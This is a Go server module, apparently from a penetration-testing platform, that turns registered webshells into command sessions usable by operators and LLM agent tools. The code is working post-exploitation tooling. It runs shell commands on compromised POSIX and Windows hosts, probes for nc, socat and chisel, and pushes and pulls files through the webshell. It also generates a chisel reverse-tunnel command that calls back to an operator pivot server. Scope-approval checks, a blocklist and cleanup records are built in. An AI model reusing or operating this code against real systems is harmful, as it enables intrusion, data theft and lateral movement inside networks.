package server

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	pathpkg "path"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/jingwei/db"
	"github.com/Autumn-27/jingwei/guard"
	"github.com/Autumn-27/jingwei/scanner"
)

// ---------------------------------------------------------------------------
// 内网两阶段 MVP：逻辑会话 + 隧道 + 范围审批 + 任务交接。
//
// 会话不驻留进程：每次执行都复用已登记的 webshell，cwd 由平台维护。所有能力
// 同时通过 HTTP API（无 LLM 可用）与 agent 工具（有 LLM 时）暴露，共用同一套
// 数据库表，因此人在页面上的操作与 LLM 的工具调用看到的是同一份状态。
// ---------------------------------------------------------------------------

const (
	intranetCwdMarker  = "__JW_CWD__"
	intranetEcMarker   = "__JW_EC__"
	intranetSizeMarker = "__JW_SIZE__"

	intranetOSPosix   = "posix"
	intranetOSWindows = "windows"
	// intranetOSProbe works on both shells: cmd.exe expands %OS%, POSIX keeps
	// it literal, so the marker only appears on Windows.
	intranetOSProbe = `echo __JW_OS__%OS% & uname -s`
	// cmd.exe defaults to the OEM code page (GBK on zh-CN), which turns Chinese
	// output into invalid UTF-8 after JSON encoding. Switch this command's
	// console to UTF-8; the change is per child process, not persistent.
	intranetWindowsCodepage = `chcp 65001 >nul & `

	// intranetProbeScript must not exit: intranetScript appends the cwd/exit-code
	// trailer after the command, and a bare exit would skip it.
	intranetProbeScript = `printf '__JW_HOST__%s\n' "$(hostname 2>/dev/null)"
printf '__JW_KERNEL__%s\n' "$(uname -srm 2>/dev/null)"
printf '__JW_USER__%s\n' "$(id 2>/dev/null)"
for b in socat nc ncat ssh chisel python3 python busybox; do command -v "$b" >/dev/null 2>&1 && printf '__JW_BIN__%s\n' "$b"; done
:
`

	intranetExecTimeout = 60 * time.Second
	intranetUploadChunk = 24 * 1024
	// cmd.exe caps a command line at 8191 characters; 4 KiB of content becomes
	// ~5.5 KiB of base64 and leaves room for the cwd/chcp/trailer wrapper.
	intranetWindowsUploadChunk = 4 * 1024
	intranetUploadLimit        = 4 << 20
	intranetDownloadLimit      = 512 << 10
	intranetBatchLimit         = 50
	intranetTunnelTTL          = time.Hour
	intranetTunnelMaxTTL       = 24 * time.Hour
)

type intranetExecOutcome struct {
	Output   string `json:"output"`
	Cwd      string `json:"cwd,omitempty"`
	ExitCode int    `json:"exit_code"`
	IsError  bool   `json:"is_error"`
	Note     string `json:"note,omitempty"`
}

type intranetProbeInfo struct {
	Host   string   `json:"host,omitempty"`
	Kernel string   `json:"kernel,omitempty"`
	User   string   `json:"user,omitempty"`
	Bins   []string `json:"bins,omitempty"`
	Raw    string   `json:"raw,omitempty"`
}

// shQuote quotes a value for POSIX sh.
func shQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// intranetHost normalizes a URL/host input to a bare lowercase host.
func intranetHost(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		if u, err := url.Parse(raw); err == nil && u.Hostname() != "" {
			raw = u.Hostname()
		}
	}
	if h, _, err := net.SplitHostPort(raw); err == nil {
		raw = h
	}
	raw = strings.Trim(raw, "[]")
	return strings.ToLower(strings.TrimSuffix(strings.TrimSpace(raw), "."))
}

func intranetHostPort(host string, port int) string {
	host = strings.TrimSpace(host)
	if strings.Contains(host, ":") && !strings.HasPrefix(host, "[") {
		return "[" + host + "]:" + strconv.Itoa(port)
	}
	return host + ":" + strconv.Itoa(port)
}

// intranetScript wraps a command with cwd restoration and exit-code reporting.
// The trailing markers are parsed out of the webshell response.
func intranetScript(cwd, command string) string {
	if strings.TrimSpace(cwd) == "" {
		cwd = "/"
	}
	return "cd " + shQuote(cwd) + " 2>/dev/null || cd /\n" +
		command + "\n__jw_ec=$?\n" +
		"printf '\\n__JW_CWD__%s\\n__JW_EC__%s\\n' \"$PWD\" \"$__jw_ec\"\n"
}

// intranetScriptWindows is the cmd.exe counterpart. PHP system() on Windows
// only runs the first line of a multi-line command, so everything is joined
// with "&". "call echo %^ERRORLEVEL%" defers expansion to a second parse, so
// the exit code is read before the trailer commands reset it.
func intranetScriptWindows(cwd, command string) string {
	prefix := intranetWindowsCodepage
	if p := intranetWindowsCwd(cwd); p != "" {
		if len(p) == 3 {
			prefix += "cd /d " + p + " & "
		} else {
			prefix += `cd /d "` + p + `" & `
		}
	}
	// 用括号包住用户命令：cmd 在 `if ... (...) else (...)` 条件为真时会吞掉
	// 后面的 & 链，导致尾部标记不执行、结果被误判为失败。
	return prefix + "(" + command + ") & call echo __JW_EC__%^ERRORLEVEL% & echo __JW_CWD__ & cd"
}

// intranetWindowsCwd validates a stored cwd as a drive-absolute Windows path
// that is safe to splice into a cmd.exe command line.
func intranetWindowsCwd(cwd string) string {
	cwd = strings.TrimSpace(cwd)
	if len(cwd) < 3 || cwd[1] != ':' {
		return ""
	}
	c := cwd[0]
	if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z') {
		return ""
	}
	if cwd[2] != '\\' && cwd[2] != '/' {
		return ""
	}
	if strings.ContainsAny(cwd, `"&|<>^`) {
		return ""
	}
	if len(cwd) > 3 {
		cwd = strings.TrimRight(cwd, "\\/")
	}
	if len(cwd) == 2 {
		cwd += `\`
	}
	if len(cwd) == 3 && cwd[2] == '/' {
		cwd = cwd[:2] + `\`
	}
	return cwd
}

// intranetAbsCwd reports whether cwd is an absolute path for the given shell.
func intranetAbsCwd(osKind, cwd string) bool {
	if osKind == intranetOSWindows {
		return intranetWindowsCwd(cwd) != ""
	}
	return strings.HasPrefix(cwd, "/")
}

// intranetWindowsPath validates and quotes a drive-absolute Windows file path.
// Percent signs, quotes and cmd metacharacters are rejected so the path cannot
// break out of the quoted argument or expand environment variables.
func intranetWindowsPath(path string) (quoted, normalized string, ok bool) {
	p := strings.TrimSpace(path)
	if len(p) < 3 || p[1] != ':' {
		return "", "", false
	}
	c := p[0]
	if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z') {
		return "", "", false
	}
	if p[2] != '\\' && p[2] != '/' {
		return "", "", false
	}
	if strings.ContainsAny(p, "\"'%&|<>^*?\x00\r\n") {
		return "", "", false
	}
	normalized = p[:2] + strings.ReplaceAll(p[2:], "/", `\`)
	return `"` + normalized + `"`, normalized, true
}

// intranetWindowsSizeCmd prints the file size in bytes via the for variable.
func intranetWindowsSizeCmd(quotedPath string) string {
	return `for %I in (` + quotedPath + `) do @echo %~zI`
}

// parseCertutilBase64 extracts the payload certutil -encode wraps between
// BEGIN/END CERTIFICATE markers, ignoring its localized progress lines.
func parseCertutilBase64(raw string) ([]byte, error) {
	const begin = "-----BEGIN CERTIFICATE-----"
	const end = "-----END CERTIFICATE-----"
	i := strings.Index(raw, begin)
	if i < 0 {
		return nil, errors.New("未找到 certutil 输出起始标记")
	}
	rest := raw[i+len(begin):]
	j := strings.Index(rest, end)
	if j < 0 {
		return nil, errors.New("未找到 certutil 输出结束标记")
	}
	body := strings.Join(strings.Fields(rest[:j]), "")
	return base64.StdEncoding.DecodeString(body)
}

// intranetOS returns the target shell family, probing once and caching the
// result in session metadata. Detection failures fall back to POSIX.
func (s *Server) intranetOS(ctx context.Context, pg *db.DB, sess *db.IntranetSession) string {
	if v, ok := sess.Metadata["os"].(string); ok && (v == intranetOSPosix || v == intranetOSWindows) {
		return v
	}
	osKind := intranetOSPosix
	detected := false
	if shell, err := s.intranetShell(pg, sess); err == nil {
		payload := scanner.BuildShellPayload(shell.ShellType, shell.Password)
		client := scanner.NewDeepClient(30 * time.Second)
		if raw, rerr := scanner.RunShellCommand(ctx, client, shell.URL, payload, intranetOSProbe); rerr == nil &&
			strings.Contains(raw, "__JW_OS__") {
			detected = true
			if strings.Contains(raw, "__JW_OS__Windows_NT") {
				osKind = intranetOSWindows
			}
		}
	}
	// 探测失败（shell 暂时不可用、404 页面等）不能缓存为 posix：
	// 否则 Windows 会话在 shell 恢复后仍会一直使用 POSIX wrapper。
	if !detected {
		return osKind
	}
	if updated, err := pg.SetIntranetSessionMetadata(sess.ID, map[string]any{"os": osKind}); err == nil && updated != nil {
		*sess = *updated
	} else {
		if sess.Metadata == nil {
			sess.Metadata = map[string]any{}
		}
		sess.Metadata["os"] = osKind
	}
	return osKind
}

// parseIntranetOutput splits the cwd/exit-code markers off the command output.
// POSIX prints the values on the marker line; the cmd.exe trailer prints them
// on the following line. ok=false means the wrapper trailer never ran.
func parseIntranetOutput(raw string) (output, cwd string, exitCode int, ok bool) {
	exitCode = -1
	lines := strings.Split(strings.ReplaceAll(raw, "\r\n", "\n"), "\n")
	cwdIdx, ecIdx := -1, -1
	for i, line := range lines {
		t := strings.TrimSpace(line)
		if strings.HasPrefix(t, intranetCwdMarker) {
			cwdIdx = i
			cwd = strings.TrimSpace(strings.TrimPrefix(t, intranetCwdMarker))
			if cwd == "" && i+1 < len(lines) {
				cwd = strings.TrimSpace(lines[i+1])
			}
		}
		if strings.HasPrefix(t, intranetEcMarker) {
			ecIdx = i
			val := strings.TrimSpace(strings.TrimPrefix(t, intranetEcMarker))
			if val == "" && i+1 < len(lines) {
				val = strings.TrimSpace(lines[i+1])
			}
			if n, err := strconv.Atoi(val); err == nil {
				exitCode = n
			}
		}
	}
	if cwdIdx < 0 || ecIdx < 0 {
		return raw, "", -1, false
	}
	first := cwdIdx
	if ecIdx < first {
		first = ecIdx
	}
	output = strings.TrimRight(strings.Join(lines[:first], "\n"), "\n")
	return output, cwd, exitCode, true
}

func truncateIntranetOutput(s string, limit int) string {
	if limit <= 0 || len(s) <= limit {
		return s
	}
	return s[:limit] + "\n…（输出已截断）"
}

// intranetTargetAllowed applies the platform asset blocklist (always) and, in
// strict mode, the task's registered scope. Tunnels to internal hosts that are
// not yet registered must go through the scope-approval API first.
func (s *Server) intranetTargetAllowed(pg *db.DB, taskID int64, host string) (string, bool) {
	host = intranetHost(host)
	if host == "" {
		return "", true
	}
	if reason, allowed := shellAllowed(pg, host); !allowed {
		return reason, false
	}
	if taskID <= 0 {
		return "", true
	}
	pol := newGuardTargetPolicy(pg)
	verdict, reason := pol.Check(taskID, nil, []string{host})
	if verdict != guard.ScopeOut {
		return "", true
	}
	mode := pol.Mode()
	if mode == "off" {
		return "", true
	}
	if mode != "strict" {
		log.Printf("[intranet][target] 范围告警(仅记录): %s", reason)
		return "", true
	}
	return reason + "。请先在「内网渗透 → 范围审批」提交申请，批准后重试", false
}

func (s *Server) intranetSession(pg *db.DB, id int64) (*db.IntranetSession, error) {
	if id <= 0 {
		return nil, errors.New("无效的会话 ID")
	}
	sess, err := pg.GetIntranetSession(id)
	if err != nil {
		return nil, errors.New("会话不存在")
	}
	if sess.Status == db.IntranetSessionClosed {
		return nil, errors.New("会话已关闭")
	}
	return sess, nil
}

func (s *Server) intranetShell(pg *db.DB, sess *db.IntranetSession) (*db.Webshell, error) {
	if sess == nil || sess.WebshellID == nil || *sess.WebshellID <= 0 {
		return nil, errors.New("会话未绑定 webshell")
	}
	shell, err := pg.GetWebshell(*sess.WebshellID)
	if err != nil {
		return nil, errors.New("绑定的 webshell 不存在")
	}
	if strings.TrimSpace(shell.URL) == "" {
		return nil, errors.New("webshell 没有可用地址")
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		return nil, errors.New("webshell 地址命中资产拦截规则：" + reason)
	}
	return shell, nil
}

// intranetRun executes one command on the session's webshell without writing an
// event (upload uses this for each chunk). It updates the stored cwd on success.
func (s *Server) intranetRun(ctx context.Context, pg *db.DB, sess *db.IntranetSession, command string, timeout time.Duration) intranetExecOutcome {
	out := intranetExecOutcome{ExitCode: -1}
	if strings.TrimSpace(command) == "" {
		out.IsError, out.Note = true, "命令不能为空"
		return out
	}
	shell, err := s.intranetShell(pg, sess)
	if err != nil {
		out.IsError, out.Note = true, err.Error()
		return out
	}
	if timeout <= 0 {
		timeout = intranetExecTimeout
	}
	cctx, cancel := context.WithTimeout(ctx, timeout+5*time.Second)
	defer cancel()
	payload := scanner.BuildShellPayload(shell.ShellType, shell.Password)
	client := scanner.NewDeepClient(timeout)
	osKind := s.intranetOS(cctx, pg, sess)
	script := intranetScript(sess.Cwd, command)
	if osKind == intranetOSWindows {
		script = intranetScriptWindows(sess.Cwd, command)
	}
	raw, err := scanner.RunShellCommand(cctx, client, shell.URL, payload, script)
	if err != nil {
		out.Output, out.IsError, out.Note = raw, true, err.Error()
		return out
	}
	output, cwd, exitCode, ok := parseIntranetOutput(raw)
	if !ok {
		out.Output, out.IsError = raw, true
		out.Note = "未解析到命令结束标记：目标可能不是预期的 shell 类型，或命令中断了执行"
		return out
	}
	out.Output, out.Cwd, out.ExitCode = output, cwd, exitCode
	if exitCode > 0 {
		out.IsError = true
	}
	if intranetAbsCwd(osKind, cwd) && cwd != sess.Cwd {
		if updated, uerr := pg.UpdateIntranetSessionState(sess.ID, cwd, "", ""); uerr == nil && updated != nil {
			*sess = *updated
		}
	} else {
		_ = pg.TouchIntranetSession(sess.ID)
	}
	return out
}

// intranetExec records the run as a session event and returns it.
func (s *Server) intranetExec(ctx context.Context, pg *db.DB, sess *db.IntranetSession, command string, timeout time.Duration) intranetExecOutcome {
	out := s.intranetRun(ctx, pg, sess, command, timeout)
	_ = pg.AddIntranetSessionEvent(sess.ID, "exec", command, truncateIntranetOutput(out.Output, 8000), out.IsError)
	return out
}

func (s *Server) intranetUpload(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, content []byte) (intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	path = strings.TrimSpace(path)
	if path == "" {
		out.IsError, out.Note = true, "目标路径不能为空"
		return out, errors.New(out.Note)
	}
	if len(content) == 0 {
		out.IsError, out.Note = true, "文件内容为空"
		return out, errors.New(out.Note)
	}
	if len(content) > intranetUploadLimit {
		out.IsError, out.Note = true, fmt.Sprintf("文件超过 %d 字节上限", intranetUploadLimit)
		return out, errors.New(out.Note)
	}
	osKind := s.intranetOS(ctx, pg, sess)
	if osKind == intranetOSWindows {
		return s.intranetUploadWindows(ctx, pg, sess, path, content)
	}
	// Overwriting a pre-existing file must not make cleanup delete someone
	// else's file, so only newly created paths enter the artifact ledger.
	existed := false
	if probe := s.intranetRun(ctx, pg, sess, "test -e "+shQuote(path)+" && echo JW_FILE_EXISTS || echo JW_FILE_NEW", 15*time.Second); strings.Contains(probe.Output, "JW_FILE_EXISTS") {
		existed = true
	}
	for offset := 0; offset < len(content); offset += intranetUploadChunk {
		end := offset + intranetUploadChunk
		if end > len(content) {
			end = len(content)
		}
		op := ">>"
		if offset == 0 {
			op = ">"
		}
		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
		cmd := "printf '%s' '" + chunk + "' | base64 -d " + op + " " + shQuote(path)
		part := s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
		if part.IsError {
			msg := fmt.Sprintf("写入第 %d 块失败: %s", offset/intranetUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
			_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
			return part, errors.New(msg)
		}
	}
	check := s.intranetRun(ctx, pg, sess, "wc -c < "+shQuote(path), 20*time.Second)
	out = check
	out.Output = fmt.Sprintf("已写入 %s（%d 字节）\n%s", path, len(content), strings.TrimSpace(check.Output))
	_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, truncateIntranetOutput(out.Output, 4000), false)
	if !existed {
		s.registerUploadedArtifact(ctx, pg, sess, osKind, path, len(content), &out)
	}
	return out, nil
}

// intranetUploadWindows writes base64 chunks to a temp file, lets certutil
// decode them, verifies the decoded size, then moves the result over the
// target. Writing to a temp file first avoids destroying an existing target
// when decoding fails halfway.
func (s *Server) intranetUploadWindows(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, content []byte) (intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	target, normalized, ok := intranetWindowsPath(path)
	if !ok {
		out.IsError, out.Note = true, "Windows 目标路径必须是盘符绝对路径，且不能包含引号、% 或通配符"
		return out, errors.New(out.Note)
	}
	if strings.HasSuffix(normalized, `\`) {
		out.IsError, out.Note = true, "Windows 目标路径必须是文件而不是目录"
		return out, errors.New(out.Note)
	}
	suffix := fmt.Sprintf(".jw%d", time.Now().UnixNano())
	b64Temp, _, ok := intranetWindowsPath(normalized + suffix + ".b64")
	if !ok {
		out.IsError, out.Note = true, "无法构造临时文件路径"
		return out, errors.New(out.Note)
	}
	binTemp, _, ok := intranetWindowsPath(normalized + suffix + ".bin")
	if !ok {
		out.IsError, out.Note = true, "无法构造临时文件路径"
		return out, errors.New(out.Note)
	}
	cleanup := func() {
		_ = s.intranetRun(ctx, pg, sess, "del /f /q "+b64Temp+" "+binTemp, 10*time.Second)
	}

	existed := false
	probe := s.intranetRun(ctx, pg, sess, "if exist "+target+" (echo JW_FILE_EXISTS) else (echo JW_FILE_NEW)", 15*time.Second)
	if strings.Contains(probe.Output, "JW_FILE_EXISTS") {
		existed = true
	}

	for offset := 0; offset < len(content); offset += intranetWindowsUploadChunk {
		end := offset + intranetWindowsUploadChunk
		if end > len(content) {
			end = len(content)
		}
		op := ">>"
		if offset == 0 {
			op = ">"
		}
		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
		part := s.intranetRun(ctx, pg, sess, "echo "+chunk+op+b64Temp, 30*time.Second)
		if part.IsError {
			cleanup()
			msg := fmt.Sprintf("写入第 %d 块失败: %s", offset/intranetWindowsUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
			_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
			return part, errors.New(msg)
		}
	}

	decode := s.intranetRun(ctx, pg, sess, "certutil -decode -f "+b64Temp+" "+binTemp, 30*time.Second)
	if decode.IsError {
		cleanup()
		msg := "certutil 解码失败: " + strings.TrimSpace(decode.Output+decode.Note)
		_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
		return decode, errors.New(msg)
	}
	sizeOut := s.intranetRun(ctx, pg, sess, intranetWindowsSizeCmd(binTemp), 20*time.Second)
	got, _ := strconv.Atoi(strings.TrimSpace(sizeOut.Output))
	if got != len(content) {
		cleanup()
		msg := fmt.Sprintf("解码后大小不符（期望 %d，实际 %q）", len(content), strings.TrimSpace(sizeOut.Output))
		sizeOut.IsError, sizeOut.Note = true, msg
		_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
		return sizeOut, errors.New(msg)
	}

	moved := s.intranetRun(ctx, pg, sess, "move /y "+binTemp+" "+target, 20*time.Second)
	if moved.IsError {
		cleanup()
		msg := "覆盖目标文件失败: " + strings.TrimSpace(moved.Output+moved.Note)
		_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
		return moved, errors.New(msg)
	}
	cleanup()
	out = moved
	// move 的本地化提示在部分系统上仍按 OEM 编码输出，省略它以免污染 JSON。
	out.Output = fmt.Sprintf("已写入 %s（%d 字节）", path, len(content))
	_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, truncateIntranetOutput(out.Output, 4000), false)
	if !existed {
		s.registerUploadedArtifact(ctx, pg, sess, intranetOSWindows, path, len(content), &out)
	}
	return out, nil
}

// registerUploadedArtifact puts a newly created file into the revocable ledger.
// The revoke command removes exactly the uploaded path; verification checks it
// is gone. A ledger failure never fails the upload itself, but is recorded.
func (s *Server) registerUploadedArtifact(ctx context.Context, pg *db.DB, sess *db.IntranetSession, osKind, targetPath string, size int, out *intranetExecOutcome) {
	taskID := int64(0)
	if sess.TaskID != nil {
		taskID = *sess.TaskID
	}
	name := pathpkg.Base(strings.ReplaceAll(targetPath, `\`, "/"))
	if name == "" || name == "." || name == "/" {
		name = targetPath
	}
	revoke := "rm -f " + shQuote(targetPath) + " && echo " + intranetArtifactOK
	verify := "test -e " + shQuote(targetPath) + " && echo " + intranetArtifactPresent + " || echo " + intranetArtifactGone
	if osKind == intranetOSWindows {
		quoted, _, ok := intranetWindowsPath(targetPath)
		if !ok {
			_ = pg.AddIntranetSessionEvent(sess.ID, "artifact", targetPath, "上传成功但登记落地物失败: Windows 路径无法生成撤销命令", true)
			return
		}
		// del 幂等：目标已被外部删除时也应该能正常走完撤销并由验证确认；
		// cmd 内建 echo 不重置 ERRORLEVEL，末尾显式归零。
		revoke = "del /f /q " + quoted + " >nul 2>&1 & echo " + intranetArtifactOK + " & cmd /c exit 0"
		verify = "(if exist " + quoted + " (echo " + intranetArtifactPresent + ") else (echo " + intranetArtifactGone + ")) & cmd /c exit 0"
	}
	art, err := pg.AddIntranetArtifact(db.IntranetArtifactInput{
		TaskID: taskID, SessionID: sess.ID, Host: sess.Host,
		Kind: db.IntranetArtifactFile, Name: name, Path: targetPath,
		Description:   fmt.Sprintf("上传文件（%d 字节）", size),
		DeployCommand: fmt.Sprintf("上传 %d 字节到 %s", size, targetPath),
		RevokeCommand: revoke,
		VerifyCommand: verify,
		Evidence:      fmt.Sprintf("上传成功：%s（%d 字节）", targetPath, size),
	})
	if err != nil {
		_ = pg.AddIntranetSessionEvent(sess.ID, "artifact", targetPath, "上传成功但登记落地物失败: "+err.Error(), true)
		return
	}
	if out != nil {
		out.Note = fmt.Sprintf("已登记落地物 #%d，撤离时将自动撤销 %s", art.ID, targetPath)
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "artifact", targetPath, fmt.Sprintf("登记落地物 #%d（%s）", art.ID, name), false)
}

func (s *Server) intranetDownload(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, maxBytes int) ([]byte, int64, bool, intranetExecOutcome) {
	out := intranetExecOutcome{ExitCode: -1}
	path = strings.TrimSpace(path)
	if path == "" {
		out.IsError, out.Note = true, "目标路径不能为空"
		return nil, 0, false, out
	}
	if maxBytes <= 0 || maxBytes > intranetDownloadLimit {
		maxBytes = intranetDownloadLimit
	}
	osKind := s.intranetOS(ctx, pg, sess)
	if osKind == intranetOSWindows {
		return s.intranetDownloadWindows(ctx, pg, sess, path, maxBytes)
	}
	cmd := "jwn=$(head -c " + strconv.Itoa(maxBytes) + " " + shQuote(path) + " | base64 | tr -d '\\n'); " +
		"printf '%s' \"$jwn\"; printf '\\n" + intranetSizeMarker + "'; wc -c < " + shQuote(path)
	out = s.intranetRun(ctx, pg, sess, cmd, 45*time.Second)
	if out.IsError {
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, truncateIntranetOutput(out.Output+out.Note, 4000), true)
		return nil, 0, false, out
	}
	encoded, sizeText := out.Output, ""
	if idx := strings.LastIndex(out.Output, intranetSizeMarker); idx >= 0 {
		encoded = out.Output[:idx]
		sizeText = strings.TrimSpace(out.Output[idx+len(intranetSizeMarker):])
	}
	encoded = strings.Join(strings.Fields(encoded), "")
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		out.IsError, out.Note = true, "返回内容不是有效 base64（目标可能缺少 base64 命令）"
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
		return nil, 0, false, out
	}
	total, _ := strconv.ParseInt(strings.Fields(sizeText + " 0")[0], 10, 64)
	truncated := total > int64(len(data))
	out.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节）", path, len(data), total)
	_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Output, false)
	return data, total, truncated, out
}

// intranetDownloadWindows uses certutil to encode the file, then parses the
// base64 between its BEGIN/END markers. The size is checked first so a large
// file is rejected before its whole content crosses the webshell.
func (s *Server) intranetDownloadWindows(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, maxBytes int) ([]byte, int64, bool, intranetExecOutcome) {
	out := intranetExecOutcome{ExitCode: -1}
	target, _, ok := intranetWindowsPath(path)
	if !ok {
		out.IsError, out.Note = true, "Windows 目标路径必须是盘符绝对路径，且不能包含引号、% 或通配符"
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
		return nil, 0, false, out
	}
	sizeOut := s.intranetRun(ctx, pg, sess, intranetWindowsSizeCmd(target), 20*time.Second)
	total, err := strconv.ParseInt(strings.TrimSpace(sizeOut.Output), 10, 64)
	if err != nil || sizeOut.IsError {
		out.IsError, out.Note = true, "无法读取文件大小（文件可能不存在或不是普通文件）"
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
		return nil, 0, false, out
	}
	if total > int64(maxBytes) {
		out.IsError, out.Note = true, fmt.Sprintf("文件 %d 字节超过下载上限 %d 字节", total, maxBytes)
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
		return nil, 0, false, out
	}
	temp := fmt.Sprintf(`"%%TEMP%%\jw%d.b64"`, time.Now().UnixNano())
	cleanup := func() {
		_ = s.intranetRun(ctx, pg, sess, "del /f /q "+temp, 10*time.Second)
	}
	enc := s.intranetRun(ctx, pg, sess, "certutil -encode -f "+target+" "+temp, 30*time.Second)
	if enc.IsError {
		cleanup()
		msg := "certutil 编码失败: " + strings.TrimSpace(enc.Output+enc.Note)
		enc.IsError, enc.Note = true, msg
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, msg, true)
		return nil, 0, false, enc
	}
	dump := s.intranetRun(ctx, pg, sess, "type "+temp, 45*time.Second)
	cleanup()
	if dump.IsError {
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, truncateIntranetOutput(dump.Output+dump.Note, 4000), true)
		return nil, 0, false, dump
	}
	data, derr := parseCertutilBase64(dump.Output)
	if derr != nil {
		out.IsError, out.Note = true, "解析 certutil 输出失败: "+derr.Error()
		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
		return nil, 0, false, out
	}
	out.ExitCode = 0
	out.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节）", path, len(data), total)
	_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Output, false)
	return data, total, false, out
}

// intranetProbe collects OS/user/tool availability from the target.
func (s *Server) intranetProbe(ctx context.Context, pg *db.DB, sess *db.IntranetSession) (intranetProbeInfo, intranetExecOutcome) {
	script := intranetProbeScript
	if s.intranetOS(ctx, pg, sess) == intranetOSWindows {
		script = `echo __JW_HOST__%COMPUTERNAME% & echo __JW_KERNEL__%OS% & echo __JW_USER__%USERNAME% & echo __JW_BIN__cmd & if exist "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" echo __JW_BIN__powershell`
	}
	out := s.intranetRun(ctx, pg, sess, script, 30*time.Second)
	info := intranetProbeInfo{Raw: truncateIntranetOutput(out.Output, 4000)}
	for _, line := range strings.Split(out.Output, "\n") {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "__JW_HOST__"):
			info.Host = strings.TrimPrefix(line, "__JW_HOST__")
		case strings.HasPrefix(line, "__JW_KERNEL__"):
			info.Kernel = strings.TrimPrefix(line, "__JW_KERNEL__")
		case strings.HasPrefix(line, "__JW_USER__"):
			info.User = strings.TrimPrefix(line, "__JW_USER__")
		case strings.HasPrefix(line, "__JW_BIN__"):
			info.Bins = append(info.Bins, strings.TrimPrefix(line, "__JW_BIN__"))
		}
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "probe", "环境探测", truncateIntranetOutput(out.Output, 4000), out.IsError)
	return info, out
}

func intranetHasBin(info intranetProbeInfo, name string) bool {
	for _, b := range info.Bins {
		if b == name {
			return true
		}
	}
	return false
}

// intranetPivotServer returns the operator-configured control endpoint that a
// chisel/ssh tunnel can dial back to. Bare hostnames/IPs default to chisel's
// 8788; JINGWEI_PIVOT_SERVER may carry an explicit port (host:port).
func intranetPivotServer() (host string, port int, err error) {
	raw := strings.TrimSpace(os.Getenv("JINGWEI_PIVOT_SERVER"))
	if raw == "" {
		return "", 0, errors.New("未配置 JINGWEI_PIVOT_SERVER（目标可访问的控制端地址，如 10.0.0.5:8788），无法自动生成 chisel/ssh 隧道命令；请手动提供 deploy_command")
	}
	if strings.Contains(raw, "://") {
		if u, perr := url.Parse(raw); perr == nil && u.Host != "" {
			raw = u.Host
		}
	}
	host = strings.Trim(strings.TrimSpace(raw), "[]")
	port = 8788
	if h, p, perr := net.SplitHostPort(strings.TrimSpace(raw)); perr == nil {
		host = strings.Trim(h, "[]")
		n, aerr := strconv.Atoi(p)
		if aerr != nil || n <= 0 || n > 65535 {
			return "", 0, errors.New("JINGWEI_PIVOT_SERVER 端口无效，应为 host:port")
		}
		port = n
	}
	if host == "" {
		return "", 0, errors.New("JINGWEI_PIVOT_SERVER 缺少主机地址")
	}
	return host, port, nil
}

func intranetPivotEndpoint() (string, error) {
	host, port, err := intranetPivotServer()
	if err != nil {
		return "", err
	}
	return intranetHostPort(host, port), nil
}

// autoSelectTunnelCommand picks the best deployment command based on what tools
// are available on the target. 隧道自动选型：目标上有什么就用什么，优先选
// 功能最强的工具（chisel > ssh > socat），而不是让操作员自己猜。
func autoSelectTunnelCommand(kind string, info intranetProbeInfo, t *db.IntranetTunnel) (deploy, reason string) {
	listenPort := t.ListenPort
	remoteHost := t.RemoteHost
	remotePort := t.RemotePort
	tunnelID := strconv.FormatInt(t.ID, 10)
	pivotHost, pivotPort, pivotErr := intranetPivotServer()

	switch kind {
	case db.IntranetTunnelKindSocks5:
		// SOCKS5: chisel > ssh -D
		if listenPort <= 0 {
			return "", "SOCKS5 需要 listen_port（目标上的 SOCKS 监听端口）"
		}
		if intranetHasBin(info, "chisel") {
			if pivotErr != nil {
				return "", pivotErr.Error()
			}
			pivot, _ := intranetPivotEndpoint()
			deploy = fmt.Sprintf("nohup chisel client --fingerprint auto %s %d:socks </dev/null >/tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
				shQuote(pivot), listenPort, tunnelID)
